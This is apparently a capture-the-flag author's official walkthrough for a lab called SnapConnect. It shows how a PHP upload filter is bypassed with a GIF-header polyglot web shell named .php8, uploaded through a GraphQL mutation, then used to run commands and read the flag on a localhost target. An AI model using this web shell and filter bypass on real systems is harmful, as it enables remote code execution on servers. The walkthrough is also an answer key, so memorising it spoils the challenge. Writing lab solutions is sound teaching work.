# SnapConnect official solution

Author document. Full spoilers.

## Approach

The avatar filter stacks two shallow controls.

1. An extension blacklist: `php, php3, php4, php5, php7, phtml, phar, pht`. It checks only the final suffix. `.php8` is missing.
2. A magic-byte check that reads the first 8 bytes and accepts JPEG, PNG, and GIF signatures. Everything after those bytes is trusted.

Apache executes `.php8` as PHP under the document root, including `uploads/`. A file with a real image signature, PHP code after it, and a `.php8` suffix clears both checks and executes.

## Steps

### 1. Enumerate the schema

```
curl -s http://localhost:8081/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { mutationType { fields { name } } } }"}'
```

```
{"data":{"__schema":{"mutationType":{"fields":[{"name":"login"},{"name":"register"},{"name":"updateProfile"},{"name":"uploadAvatar"}]}}}}
```

### 2. Register and keep the token

```
curl -s http://localhost:8081/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { register(username: \"solver\", email: \"solver@example.com\", password: \"solver-pass-1\") { token } }"}'
```

```
{"data":{"register":{"token":"<64 hex characters>"}}}
```

### 3. Probe the controls

Upload each probe with the multipart request from step 5. Results:

- `shell.php` with raw PHP returns `File type not allowed.`
- `shell.php8` with raw PHP returns `File does not look like an image.`
- `avatar.png` with a valid PNG returns `{"success":true,"url":"/uploads/avatar.png"}`

Two different messages and the `.php` versus `.php8` difference reveal both layers and the gap in the list.

### 4. Craft the polyglot

```
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.jpg.php8
```

`GIF89a` passes the content check, `.php8` passes the blacklist, and the text before `<?php` renders as inert output.

### 5. Upload it

```
curl -s http://localhost:8081/graphql \
  -H "Authorization: Bearer $TOKEN" \
  -F 'operations={"query":"mutation($file: Upload!) { uploadAvatar(file: $file) { success url message } }","variables":{"file":null}}' \
  -F 'map={"0":["variables.file"]}' \
  -F '0=@shell.jpg.php8;type=application/octet-stream'
```

```
{"data":{"uploadAvatar":{"success":true,"url":"/uploads/shell.jpg.php8","message":"Avatar updated."}}}
```

### 6. Execute and read the flag

```
curl -s 'http://localhost:8081/uploads/shell.jpg.php8?cmd=id'
```

```
GIF89auid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
curl -s 'http://localhost:8081/uploads/shell.jpg.php8?cmd=cat%20%2Fvar%2Fwww%2Fflag.txt'
```

```
GIF89aduck{...}
```

Verify the flag against the organizer's expected value, or run the automated proof below.

## Automated proof

`ops/validate.py` walks every phase above and the negative checks: blocked `.php`, blocked raw `.php8`, blocked `.htaccess`, contained traversal, no static flag, no directory listing, auth required, emails hidden on public profiles. Result from the last clean-state run: 37 checks passed, flag hash matched `lab.yml`.

```
solve complete: 37 checks passed, flag duck{...} verified
```
